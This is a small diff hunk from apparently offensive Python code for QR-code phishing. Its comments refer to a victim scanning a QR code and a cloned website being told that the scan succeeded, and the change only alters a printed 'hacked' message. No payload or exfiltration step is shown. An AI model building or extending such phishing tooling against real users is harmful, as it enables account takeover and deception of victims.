@@ -34,7 +34,7 @@ def get_qr():
         if not os.path.isfile('hacked'):  # if there is no hacked file, the victim still has to scan
             return get_png_b64()
         else:  # else, the victim scanned the qr code. We tell so to the cloned website
-            print('hacked')
+            print('mf hacked')
             return 'hacked'
 
 
